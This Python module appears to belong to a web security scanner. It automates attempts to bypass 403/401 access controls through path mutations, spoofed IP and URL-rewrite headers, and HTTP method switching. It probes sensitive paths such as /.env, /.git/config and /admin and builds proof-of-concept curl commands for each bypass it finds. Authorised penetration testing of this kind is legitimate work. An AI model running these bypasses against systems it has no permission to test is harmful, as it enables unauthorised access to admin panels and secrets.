"""403 Bypass Engine — Multi-technique access control bypass validator.

Techniques:
1. Path Mutation: trailing slash, dot, double URL encoding, case variation
2. Header Injection: X-Original-URL, X-Forwarded-For, X-Rewrite-URL, etc.
3. HTTP Method Switching: GET→POST, PUT, PATCH, DELETE, OPTIONS, TRACE
4. Protocol Manipulation: HTTP/1.0, path normalization tricks
5. Path Traversal Bypass: /..;/, /./, //

All attempts are controlled and non-destructive (V5 §4 SAFE tier).
"""

from __future__ import annotations

from app.validation.safety.legacy import ValidationHTTPClient

import logging
import re
import uuid
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, urlunparse, quote

import httpx

logger = logging.getLogger("validation.bypass_403")

_TIMEOUT = httpx.Timeout(10.0, connect=6.0)
_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}


@dataclass
class BypassResult:
    """Result of a successful 403 bypass attempt."""
    url: str
    original_url: str
    original_status: int
    bypass_status: int
    technique: str
    technique_detail: str
    confidence: str  # CONFIRMED / VALIDATED
    evidence_level: str
    poc_curl: str = ""
    reproduction_steps: List[str] = field(default_factory=list)
    evidence: Dict[str, Any] = field(default_factory=dict)
    response_body_sample: str = ""


def _curl(method: str, url: str, headers: Optional[Dict] = None) -> str:
    parts = [f"curl -sk -X {method}"]
    for k, v in (headers or {}).items():
        parts.append(f"-H '{k}: {v}'")
    parts.append(f"'{url}'")
    return " ".join(parts)


class Bypass403Engine:
    """Multi-technique 403 bypass testing engine."""

    # Interesting endpoints to check for 403 bypass
    SENSITIVE_PATHS = [
        "/admin", "/administrator", "/dashboard", "/panel",
        "/console", "/manage", "/manager", "/management",
        "/internal", "/debug", "/server-status", "/server-info",
        "/wp-admin", "/wp-login.php",
        "/api/admin", "/api/v1/admin", "/api/internal",
        "/graphql", "/graphiql",
        "/.env", "/.git/config", "/config", "/configuration",
        "/actuator", "/actuator/env",
        "/phpmyadmin", "/phpMyAdmin", "/pma",
        "/swagger", "/swagger-ui", "/api-docs",
    ]

    async def _safe_request(
        self,
        method: str,
        url: str,
        headers: Optional[Dict] = None,
        follow: bool = False,
    ) -> Optional[httpx.Response]:
        hdrs = {**_HEADERS, **(headers or {})}
        try:
            async with ValidationHTTPClient(
                timeout=_TIMEOUT, verify=False, follow_redirects=follow, http2=False,
            ) as c:
                return await c.request(method, url, headers=hdrs)
        except Exception:
            return None

    # -----------------------------------------------------------------------
    # Bypass Techniques
    # -----------------------------------------------------------------------

    def _path_mutations(self, path: str) -> List[Dict[str, str]]:
        """Generate path mutation variants."""
        mutations = []
        base = path.rstrip("/")

        # Trailing characters
        for suffix in ["/", "/.", "//", "/./", "/%20", "/%09", "/%00", ";", "..;/", "/..;/"]:
            mutations.append({"path": base + suffix, "detail": f"trailing '{suffix}'"})

        # Prefix tricks
        for prefix in ["//", "/./", "/./"]:
            mutations.append({"path": prefix + base.lstrip("/"), "detail": f"prefix '{prefix}'"})

        # URL encoding variations
        encoded = quote(base, safe="")
        mutations.append({"path": encoded, "detail": "full URL encode"})

        # Double URL encoding
        double_encoded = quote(encoded, safe="")
        mutations.append({"path": double_encoded, "detail": "double URL encode"})

        # Case variations
        mutations.append({"path": base.upper(), "detail": "uppercase"})
        mutations.append({"path": base.swapcase(), "detail": "swapcase"})

        # Unicode normalization tricks
        mutations.append({"path": base.replace("/", "%ef%bc%8f"), "detail": "unicode fullwidth slash"})

        # Path traversal tricks
        mutations.append({"path": base + "/..;/", "detail": "..;/ bypass (Tomcat)"})
        mutations.append({"path": base.replace("/", "/.//"), "detail": "/.// normalization"})

        return mutations

    def _header_bypass_sets(self, original_path: str) -> List[Dict[str, Any]]:
        """Generate header-based bypass attempts."""
        parsed = urlparse(original_path) if "://" in original_path else None
        path_only = parsed.path if parsed else original_path

        header_sets = [
            {"headers": {"X-Original-URL": path_only}, "detail": "X-Original-URL header"},
            {"headers": {"X-Rewrite-URL": path_only}, "detail": "X-Rewrite-URL header"},
            {"headers": {"X-Custom-IP-Authorization": "127.0.0.1"}, "detail": "X-Custom-IP-Authorization: 127.0.0.1"},
            {"headers": {"X-Forwarded-For": "127.0.0.1"}, "detail": "X-Forwarded-For: 127.0.0.1"},
            {"headers": {"X-Forwarded-For": "localhost"}, "detail": "X-Forwarded-For: localhost"},
            {"headers": {"X-Forwarded-Host": "localhost"}, "detail": "X-Forwarded-Host: localhost"},
            {"headers": {"X-Host": "localhost"}, "detail": "X-Host: localhost"},
            {"headers": {"X-Remote-IP": "127.0.0.1"}, "detail": "X-Remote-IP: 127.0.0.1"},
            {"headers": {"X-Remote-Addr": "127.0.0.1"}, "detail": "X-Remote-Addr: 127.0.0.1"},
            {"headers": {"X-ProxyUser-Ip": "127.0.0.1"}, "detail": "X-ProxyUser-Ip: 127.0.0.1"},
            {"headers": {"X-Original-Remote-Addr": "127.0.0.1"}, "detail": "X-Original-Remote-Addr: 127.0.0.1"},
            {"headers": {"X-Originating-IP": "127.0.0.1"}, "detail": "X-Originating-IP: 127.0.0.1"},
            {"headers": {"True-Client-IP": "127.0.0.1"}, "detail": "True-Client-IP: 127.0.0.1"},
            {"headers": {"Client-IP": "127.0.0.1"}, "detail": "Client-IP: 127.0.0.1"},
            {"headers": {"Referer": original_path.replace(path_only, "/")}, "detail": "Referer: root URL"},
            {"headers": {"X-Forwarded-For": "10.0.0.1", "X-Real-IP": "10.0.0.1"}, "detail": "internal IP chain"},
        ]
        return header_sets

    def _method_variants(self) -> List[str]:
        """HTTP method switching attempts."""
        return ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]

    # -----------------------------------------------------------------------
    # Main bypass testing
    # -----------------------------------------------------------------------

    async def test_url(self, url: str) -> List[BypassResult]:
        """Test a single URL for 403 bypass opportunities."""
        results: List[BypassResult] = []

        # Step 1: Confirm the URL returns 403/401
        original_resp = await self._safe_request("GET", url)
        if not original_resp or original_resp.status_code not in (401, 403):
            return results  # Not a 403/401, nothing to bypass

        original_status = original_resp.status_code
        original_body_hash = hash(original_resp.text[:500])

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Step 2: Path mutation attempts
        for mutation in self._path_mutations(parsed.path):
            mutated_url = base + mutation["path"]
            if mutated_url == url:
                continue
            resp = await self._safe_request("GET", mutated_url)
            if resp and resp.status_code == 200 and len(resp.text) > 50:
                body_hash = hash(resp.text[:500])
                if body_hash != original_body_hash:
                    results.append(BypassResult(
                        url=mutated_url,
                        original_url=url,
                        original_status=original_status,
                        bypass_status=200,
                        technique="path_mutation",
                        technique_detail=mutation["detail"],
                        confidence="CONFIRMED",
                        evidence_level="E3",
                        poc_curl=_curl("GET", mutated_url),
                        reproduction_steps=[
                            f"Original request: GET {url} → HTTP {original_status}",
                            f"Bypass request: GET {mutated_url} → HTTP 200",
                            f"Technique: {mutation['detail']}",
                            "Compare response content to verify access to protected resource",
                        ],
                        evidence={
                            "original_url": url,
                            "bypass_url": mutated_url,
                            "original_status": original_status,
                            "bypass_status": 200,
                            "technique": mutation["detail"],
                        },
                        response_body_sample=resp.text[:500],
                    ))
                    break  # One bypass is enough proof

        # Step 3: Header bypass attempts
        for header_set in self._header_bypass_sets(url):
            resp = await self._safe_request("GET", url, headers=header_set["headers"])
            if resp and resp.status_code == 200 and len(resp.text) > 50:
                body_hash = hash(resp.text[:500])
                if body_hash != original_body_hash:
                    results.append(BypassResult(
                        url=url,
                        original_url=url,
                        original_status=original_status,
                        bypass_status=200,
                        technique="header_injection",
                        technique_detail=header_set["detail"],
                        confidence="CONFIRMED",
                        evidence_level="E3",
                        poc_curl=_curl("GET", url, header_set["headers"]),
                        reproduction_steps=[
                            f"Original request: GET {url} → HTTP {original_status}",
                            f"Bypass request: GET {url} with {header_set['detail']} → HTTP 200",
                            "Protected content accessible via header manipulation",
                        ],
                        evidence={
                            "headers_used": header_set["headers"],
                            "original_status": original_status,
                            "bypass_status": 200,
                            "technique": header_set["detail"],
                        },
                        response_body_sample=resp.text[:500],
                    ))
                    break

        # Step 4: Method switching
        for method in self._method_variants():
            resp = await self._safe_request(method, url)
            if resp and resp.status_code == 200 and len(resp.text) > 50:
                body_hash = hash(resp.text[:500])
                if body_hash != original_body_hash:
                    results.append(BypassResult(
                        url=url,
                        original_url=url,
                        original_status=original_status,
                        bypass_status=200,
                        technique="method_switching",
                        technique_detail=f"GET→{method}",
                        confidence="CONFIRMED",
                        evidence_level="E3",
                        poc_curl=_curl(method, url),
                        reproduction_steps=[
                            f"Original: GET {url} → HTTP {original_status}",
                            f"Bypass: {method} {url} → HTTP 200",
                            f"Access control only enforced on GET, not {method}",
                        ],
                        evidence={
                            "method_used": method,
                            "original_status": original_status,
                            "bypass_status": 200,
                        },
                        response_body_sample=resp.text[:500],
                    ))
                    break

        return results

    async def scan_target(self, base_url: str, discovered_urls: Optional[List[str]] = None) -> List[BypassResult]:
        """Scan a target for 403 bypass on sensitive paths + discovered URLs."""
        all_results: List[BypassResult] = []

        # Test standard sensitive paths
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in self.SENSITIVE_PATHS:
            url = base + path
            try:
                bypasses = await self.test_url(url)
                all_results.extend(bypasses)
            except Exception as exc:
                logger.debug("403 bypass error on %s: %s", url, exc)

        # Test discovered URLs that returned 403
        if discovered_urls:
            for disc_url in discovered_urls[:30]:
                try:
                    resp = await self._safe_request("GET", disc_url)
                    if resp and resp.status_code in (401, 403):
                        bypasses = await self.test_url(disc_url)
                        all_results.extend(bypasses)
                except Exception as exc:
                    logger.debug("403 bypass error on discovered URL %s: %s", disc_url, exc)

        return all_results


# Module-level singleton
bypass_403_engine = Bypass403Engine()
